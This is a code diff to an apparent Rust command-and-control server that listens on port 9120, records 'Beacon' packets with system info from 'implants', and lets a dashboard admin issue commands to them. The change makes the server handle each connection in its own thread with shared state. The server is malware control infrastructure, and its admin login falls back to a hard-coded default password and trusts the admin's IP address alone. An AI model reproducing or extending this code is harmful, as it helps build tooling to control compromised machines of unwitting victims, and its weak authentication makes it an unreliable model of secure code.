@@ -3,6 +3,8 @@ use std::{
     env,
     io::{Read, Write},
     net::{IpAddr, TcpListener, TcpStream},
+    sync::{Arc, Mutex},
+    thread,
     time::SystemTime,
 };
 
@@ -10,53 +12,67 @@ use common::{IMPLANT_REPORT_RATE_SECONDS, Implant, MAX_PACKET_SIZE_BYTES, Packet
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let listener = TcpListener::bind("0.0.0.0:9120")?;
-    let mut implants = HashMap::new();
-    let mut admin_ip = None;
+    let implants = Arc::new(Mutex::new(HashMap::new()));
+    let admin_ip = Arc::new(Mutex::new(None));
 
     for stream in listener.incoming() {
         let mut stream = stream.unwrap();
-        let ip = stream.peer_addr().unwrap().ip();
 
-        let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];
+        let implants = Arc::clone(&implants);
+        let admin_ip = Arc::clone(&admin_ip);
 
-        stream.read(&mut buf).expect("failed to read from stream");
+        thread::spawn(move || {
+            let ip = stream.peer_addr().unwrap().ip();
 
-        let decoded = decode(&buf).unwrap();
-        println!("{decoded:?}");
+            let mut buf = vec![0; MAX_PACKET_SIZE_BYTES];
 
-        match decoded {
-            Packet::Beacon { system_info } => {
-                implants.insert(stream.peer_addr().unwrap().ip(), Implant::new(system_info));
-            }
-            Packet::DashboardLogin { password } => {
-                let passwd = match env::var_os("TYSE_PASSWORD") {
-                    Some(os_string) => os_string.into_string().unwrap_or("baka".to_string()),
-                    None => "baka".to_string(),
-                };
+            stream.read(&mut buf).expect("failed to read from stream");
 
-                if passwd == password {
-                    stream.write(encode(Packet::LoginSuccess).unwrap().as_slice())?;
+            let decoded = decode(&buf).unwrap();
+            println!("{decoded:?}");
 
-                    println!("{ip} logged in as admin");
-                    admin_ip = Some(ip);
-                } else {
-                    println!("{ip} failed to log in");
-                    stream.write(encode(Packet::LoginFailed).unwrap().as_slice())?;
+            match decoded {
+                Packet::Beacon { system_info } => {
+                    implants
+                        .lock()
+                        .unwrap()
+                        .insert(stream.peer_addr().unwrap().ip(), Implant::new(system_info));
+                }
+                Packet::DashboardLogin { password } => {
+                    let passwd = match env::var_os("TYSE_PASSWORD") {
+                        Some(os_string) => os_string.into_string().unwrap_or("baka".to_string()),
+                        None => "baka".to_string(),
+                    };
+
+                    if passwd == password {
+                        stream
+                            .write(encode(Packet::LoginSuccess).unwrap().as_slice())
+                            .unwrap();
+
+                        println!("{ip} logged in as admin");
+                        *admin_ip.lock().unwrap() = Some(ip);
+                    } else {
+                        println!("{ip} failed to log in");
+                        stream
+                            .write(encode(Packet::LoginFailed).unwrap().as_slice())
+                            .unwrap();
+                    }
+                }
+                _ => {
+                    if let Some(admin_ip) = *admin_ip.lock().unwrap()
+                        && stream.peer_addr().unwrap().ip() == admin_ip
+                    {
+                        run_admin_command(&mut stream, &decoded, &mut implants.lock().unwrap())
+                            .unwrap();
+                    } else {
+                        println!(
+                            "Unauthorized device tried to access admin commands: {}",
+                            stream.peer_addr().unwrap().ip()
+                        );
+                    }
                 }
             }
-            _ => {
-                if let Some(admin_ip) = admin_ip
-                    && stream.peer_addr().unwrap().ip() == admin_ip
-                {
-                    run_admin_command(&mut stream, &decoded, &mut implants)?;
-                } else {
-                    println!(
-                        "Unauthorized device tried to access admin commands: {}",
-                        stream.peer_addr().unwrap().ip()
-                    );
-                }
-            }
-        }
+        });
     }
 
     Ok(())
